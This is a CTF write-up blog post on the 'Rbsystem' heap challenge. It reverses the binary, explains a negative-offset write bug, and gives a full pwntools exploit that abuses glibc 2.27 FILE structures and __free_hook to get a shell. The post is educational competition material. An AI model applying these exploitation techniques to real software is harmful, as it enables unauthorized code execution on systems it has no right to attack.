---
layout: "post"
title: "Cyber Mimic 2020 Rbsystem Writeup"
date: 2020-6-21
tags: [Heap, File Structures,CTF]
---

This weekend , we have a great time playing Cyber Mimic CTF and this post is supposedly the intended solution for the challenge **Rbsystem** that we solved during the CTF.

## TL;DR OF THE BINARY

The binary is a standard `x86 64-bit` Dynamically linked binary. The given libc is **2.27**.

Here's what checksec has to say.

```py
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Let's jump to Reversing it.

## REVERSING

Firing up ghidra , We see that its a standard CTF-style menu driven binary which has the following options.

For the sake of understanding , I'll not be going in the actual order of appearance of these options in the binary.
{: .notice}

1. **Allocate** -
    * Asks for *unsigned long* index ,checks if it is less that **0x10** and also checks if the bss table corresponding to that index is empty or not.
    * It then requests *unsigned long* **size** ,checks if it is less that **0x1001** and then calls **malloc** with that size.
    * It then stores the malloc pointer to the bss table that corresponds to allocated chunks and the size to the corresponding bss table.


```c
void add(void)

{
  ulong idx;
  ulong __size;
  void *pvVar1;
  
  printf("Index: ");
  idx = get_int();
  if ((idx < 0x10) && (*(long *)(&arr_alloc + idx * 8) == 0)) {
    printf("Size: ");
    __size = get_int();
    if (__size < 0x1001) {
      pvVar1 = malloc(__size);
      if (pvVar1 == (void *)0x0) {
        puts("allocate failed");
      }
      else {
        *(void **)(&arr_alloc + idx * 8) = pvVar1;
        *(ulong *)(&arr_size + idx * 8) = __size;
        puts("Done!");
      }
    }
  }
  return;
}
```

2. **Open** -
    * This option basically opens the file **/dev/urandom** and sets a flag to mark it open.

```c
void open(void)

{
  if (open_bit == 0) {
    file_ptr = fopen("/dev/urandom","rb");
    if (file_ptr == (FILE *)0x0) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    open_bit = 1;
    puts("Done!");
  }
  return;
}

```

3. **Close** - 
    * This option closes the file opened by **Open** function and clears the flag that was set previously.

```c
void close(void)

{
  if (open_bit != 0) {
    fclose(file_ptr);
    open_bit = 0;
    file_ptr = (FILE *)0x0;
  }
  return;
}

```

4. **Edit** -
    * Initially checks for the flag that is set by the **open** function to check if the file **/dev/urandom** is open or not.
    * If the file is opened , it then goes about asking *unsigned long* **Index** , checks if index is less than 0x10 and checks whether an allocation exists in the bss table.
    * It then asks for a *long* **offset** and a *size_t* **size**.
    * Checks whether **size + offset** is less than or equal to actual size that was recorded in the sizes table of bss.
    * Finally it calls **fread** and reads **size** number of **random bytes** from **/dev/urandom** starting from the **offset** specified.


```c

void edit(void)

{
  ulong idx;
  long offset;
  size_t __size;

  if (open_bit != 0) {
    printf("Index: ");
    idx = get_int();
    if ((idx < 0x10) && (*(long *)(&arr_alloc + idx * 8) != 0)) {
      printf("Offset: ");
      offset = get_int();
      printf("Size: ");
      __size = get_int();
      if ((long)(__size + offset) <= *(long *)(&arr_size + idx * 8)) {
        fread((void *)(*(long *)(&arr_alloc + idx * 8) + offset),__size,1,file_ptr);
        puts("Done!");
      }
    }
  }
  return;
}

```

Now that we have reversed the code , let's get our hands dirty with exploit.

## EXPLOIT DEVELOPMENT

The bug was quite inevitable in the edit function where for offset calculation a **long** type integer was used. We could pass negetive integers as offset and write random bytes at almost arbitrary locations.

So at this point we were quite stuck , what is the use of writing out random bytes anywhere? Then after sometime,  something weird but interesting popped up.

Well we can write random bytes anywhere ,

Why not try writing just one **null** byte at the **File Descriptor field** of the file structure stored on heap so that it reads from **stdin** instead of **/dev/urandom**?
{: .notice}

Well this idea was great but it required a 1 byte brute force over the server [and our vm was deadslow :/].

Having no other option at our hands , we decided to go this way.

wait , what about leaks?

Thats a little trivial since we can close and re allocate our file structure on heap. Here's the idea.

* Call **Open** and allocate the file structure on heap.
* Now call malloc to avoid top consolidation
* Close the file structure.
> **Remember** that **fclose** calls **free** internally.
* Now malloc as the same size of the file structure.
* Well you have the old file structure with some libc pointers still lurking around which u can leak by adding random bytes till that location by calling **edit**.

```py
from pwn import *
import sys

if(len(sys.argv)>1):
    io=remote('172.35.29.46',9999)
    context.noptrace=True
else:
    io=process('./rbsystem',env = {"LD_PRELOAD" : "./libc.so.6"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

def add(idx,size):
    sla('choice: ','1')
    sla('Index: ',str(idx))
    sla('Size: ',str(size))

def edit(idx,off,size):
    sla('choice: ','2')
    sla('Index: ',str(idx))
    sla('Offset: ',str(off))
    sla('Size: ',str(size))

def show(idx):
    sla('choice: ','3')
    sla('Index: ',str(idx))

def fopen():
    sla('choice: ','4')

def fclose():
    sla('choice: ','5')

if __name__=="__main__":
    fopen()
    fclose()
    add(0,544)
    fopen()
    #Fill with random bytes until Libc
    edit(0,0,104)
    #Get libc
    show(0)
    re(113)
    libc_base = u64(re(6)+"\x00"*2) - 0x3ec680
    log.info("Libc @ "+str(hex(libc_base)))
    #Well sometimes the exploit crashed due to some corrupted leak and hence I added this check
    if(hex(libc_base)[2:4]=="7f"):
        #Add a chunk in such a way that file structure if above it in memory.
        add(1,544)
        #Here goes our random byte at the offset of fd of the file structure.
        edit(1,-4560,1)
        #add a buffer chunk of 0x1000 bytes and call edit on it to fill it with random bytes.
        add(2,0x1000)
        edit(2,0,3991)
```

The next edit should take input from stdin if the file descriptor has been nulled out by that random byte.

Now we can directly edit our file structure with our input.

Note that here we cant go for **vtable** overwrite as there would be checks in **glibc 2.27**.
{: .notice}

Hence we decided to achieve arbitrary write by using **IO\_buf\_base** and **IO\_buf\_end**. If we overwrite **IO\_buf\_base** with malloc/free hook and **IO\_buf\_end** with somewhere after **free/malloc hook** , we can write one gadget to either of these pointers.

Initially we overwrote **\__malloc\_hook** to get shell but the constraints of **one\_gadget** wouldn't satisfy hence we tried overwriting **free\_hook** with system and overwrite file pointer **magic number** with **/bin/sh** to get shell in internals of **fclose** but the problem was that , on server the magic number was not overwritten with **/bin/sh** rather it executed **system(magic\_num)** which didnt give us shell. 

Finally overwriting **free\_hook** with a suitable gadget only gave shell.

Here's the rest of the script

```py
        #Overwriting buf_base and buf_end with free_hook and region nearby
        buf_base = libc_base + 0x3ebc30
        buf_end = libc_base + 0x3ebd40
        gdb.attach(io)
        #Finally calling edit to take input at file structure from stdin
        edit(1,-4616,16)
        payload = p64(buf_base) + p64(buf_end)
        io.sendline(payload)
        one_gadget = libc_base + 0x10a38c
        #Now we write to free_hook
        edit(1,-4688,8)
        payload = p64(one_gadget)+"a"*8 + p64(one_gadget)
        io.sendline(payload)
        gdb.attach(io)
        fclose()
    else:
        log.info('Restart Exploit')
    io.interactive()

```

## CONCLUSION

I really liked the idea of writing just one null byte using **/dev/urandom** and then brute forcing to get shell.

Enjoyed solving the challenge, credits to [sherl0ck](https://twitter.com/sherl0ck__) for the idea.

Here's the [script](https://gist.github.com/PwnVerse/79485fce497bb30e7eaf4e9b01a6a20c).
